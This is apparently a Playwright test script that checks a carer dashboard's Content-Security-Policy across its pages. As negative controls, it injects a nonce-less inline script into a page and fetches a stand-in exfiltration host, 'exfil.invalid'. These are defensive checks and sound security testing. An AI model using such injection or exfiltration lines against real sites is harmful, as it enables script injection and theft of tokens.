// Load the carer dashboard's pages in a real browser and fail on any Content-Security-Policy
// violation, or on a page that does not show its content.
//
//   node scripts/security/csp_browser_check.mjs
//
// Expects a production dashboard (`npm run build && npm start`, port 3000 by default:
// DASHBOARD_URL), built with NEXT_PUBLIC_CARE_API_BASE_URL set to the demo API
// (IRA_CARE_API, default http://127.0.0.1:8010), and .demo/demo.local.json from
// scripts/demo/seed_demo.py. It raises one Help request from the first person's watch, with a
// location, so the alert and emergency views have something to show. Everything is fake.
//
// Two negative controls show that the check can fail: an inline script without the nonce is
// added to one page's HTML on its way to the browser and must be refused, and a page must be
// refused a connection to an origin other than its own and the API's.
import { createRequire } from 'node:module';
import { readFileSync } from 'node:fs';
const { chromium } = createRequire(import.meta.url)('playwright');

const API = process.env.IRA_CARE_API ?? 'http://127.0.0.1:8010';
const DASH = process.env.DASHBOARD_URL ?? 'http://localhost:3000';
const info = JSON.parse(readFileSync(process.env.IRA_DEMO_INFO ?? '.demo/demo.local.json', 'utf8'));
const manager = info.logins.find((l) => l.role === 'workspace_admin');
const person = info.people[0];

// One Help request from the first person's watch, with where they are.
const help = await fetch(`${API}/api/v1/care/devices/me/help`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-Device-Token': person.device_token, 'X-Idempotency-Key': `csp-${Date.now()}` },
  body: JSON.stringify({ via: 'button', note: 'Policy check', location: { latitude: 51.5072, longitude: -0.1276, accuracy_m: 20 } }),
});
if (!help.ok) throw new Error(`Help request failed: ${help.status} ${await help.text()}`);

const browser = await chromium.launch();
const page = await (await browser.newContext({ viewport: { width: 1280, height: 900 } })).newPage();
const violations = [];
const errors = [];
const controls = [];
let current = '';
let inControls = false;
page.on('console', (m) => {
  const t = m.text();
  if (/Content Security Policy|Refused to/i.test(t)) (inControls ? controls : violations).push(`${current}: ${t}`);
  else if (m.type() === 'error' && !inControls) errors.push(`${current}: ${t}`);
});
page.on('pageerror', (e) => { if (!inControls) errors.push(`${current}: ${e.message}`); });
page.on('response', (r) => { if (r.status() >= 400 && !inControls) errors.push(`${current}: HTTP ${r.status()} ${r.request().method()} ${r.url()}`); });
await page.addInitScript(() => {
  window.__csp = [];
  document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
});

const exercised = [];
async function visit(path, expectText, { status = 200 } = {}) {
  current = path;
  const res = await page.goto(`${DASH}${path}`);
  if (res.status() !== status) throw new Error(`${path}: HTTP ${res.status()}, expected ${status}`);
  const csp = res.headers()['content-security-policy'] ?? '';
  if (status === 200 && !/script-src 'nonce-[^']+' 'strict-dynamic'/.test(csp)) throw new Error(`${path}: no nonce policy (${csp})`);
  if (/unsafe-eval|script-src[^;]*unsafe-inline/.test(csp)) throw new Error(`${path}: policy allows unsafe script (${csp})`);
  await page.waitForLoadState('networkidle');
  for (const t of [].concat(expectText)) await page.getByText(t).first().waitFor({ timeout: 20_000 });
  const fromEvents = await page.evaluate(() => window.__csp);
  for (const v of fromEvents) violations.push(`${path}: ${v}`);
  exercised.push(`${path} (HTTP ${res.status()}; saw ${[].concat(expectText).map((t) => JSON.stringify(String(t))).join(', ')})`);
}

// Signed out.
await visit('/login', 'Sign in');
await visit('/signup', /organisation/i);
await visit('/join', /join/i);
await visit('/watch', 'Not found', { status: 404 }); // a production build has no demonstration pages

// Sign in through the form, as a carer would (the server address is under Advanced).
current = '/login (sign in)';
await page.goto(`${DASH}/login`);
await page.waitForLoadState('networkidle');
await page.getByText('Advanced').click();
await page.getByLabel('Care server').fill(API);
await page.getByLabel('Username').fill(manager.email);
await page.getByLabel('Password').fill(manager.password);
await page.getByRole('button', { name: /sign in/i }).click();
await page.waitForURL((u) => !u.pathname.includes('login'), { timeout: 30_000 });

const name = person.display_name.split(' ')[0];
await visit('/', ['Overview', 'Alerts awaiting a response', name]);
await visit('/alerts', [name, /help/i]);
await page.locator('[data-testid^="alert-"]').first().waitFor();
for (const tab of ['overview', 'profile', 'plan', 'health', 'care', 'timeline', 'alerts', 'ira', 'reports', 'search', 'access']) {
  const words = tab === 'overview' ? [name, /emergency|help/i] : tab === 'care' ? [name, 'Live: updated'] : [name];
  await visit(`/people/${person.id}?tab=${tab}`, words);
}
await visit('/visits', /visit/i);
await visit('/team', /team/i);
await visit('/search', 'Search for');
await page.getByLabel('Search for').fill(name);
await page.getByRole('button', { name: 'Search' }).click();
await page.getByTestId('search-results').getByText(name).first().waitFor();
await visit('/billing', /plan/i);

// Negative control 1: an inline script without the nonce, added to the HTML, must not run.
// (A page fulfilled by the test harness is treated as a public page, so the browser also stops
// its calls to the loopback API; that is the harness, not the policy, and is not counted.)
inControls = true;
current = '/visits (injected inline script)';
await page.route(`${DASH}/visits`, async (route) => {
  const r = await route.fetch();
  const html = (await r.text()).replace('</body>', '<script>window.__injected = true</script></body>');
  await route.fulfill({ response: r, body: html });
});
await page.goto(`${DASH}/visits`);
await page.waitForLoadState('networkidle');
const injectedRan = await page.evaluate(() => window.__injected === true);
const injectedSeen = (await page.evaluate(() => window.__csp)).some((v) => v.startsWith('script-src'));
await page.unroute(`${DASH}/visits`);

// Negative control 2: a connection to any other origin is refused (the token cannot leave).
current = '/visits (connection elsewhere)';
const exfil = await page.evaluate(() => fetch('https://exfil.invalid/x').then(() => 'sent', () => 'refused'));
const exfilSeen = (await page.evaluate(() => window.__csp)).some((v) => v.startsWith('connect-src'));
// String eval through setTimeout is refused too (no 'unsafe-eval').
await page.evaluate(() => { try { setTimeout('window.__evalRan = true', 0); } catch { /* refused */ } });
await page.waitForTimeout(300);
const evalRan = await page.evaluate(() => window.__evalRan === true);

await browser.close();

console.log('Pages exercised:');
for (const e of exercised) console.log(`  ${e}`);
console.log(`CSP violations on the real pages: ${violations.length}`);
for (const v of violations) console.log(`  ${v}`);
console.log(`Other console errors and failed requests (not policy; listed for the record): ${errors.length}`);
for (const e of errors) console.log(`  ${e}`);
console.log(`Policy refusals during the negative controls: ${controls.length}`);
for (const c of controls) console.log(`  ${c.slice(0, 160)}`);
console.log(`Negative control, injected inline script: ran=${injectedRan}, violation reported=${injectedSeen}`);
console.log(`Negative control, fetch to another origin: ${exfil}, violation reported=${exfilSeen}`);
console.log(`Negative control, string eval: ran=${evalRan}`);
const ok = violations.length === 0 && !injectedRan && injectedSeen && exfil === 'refused' && exfilSeen && !evalRan;
console.log(ok ? 'PASS' : 'FAIL');
process.exit(ok ? 0 : 1);
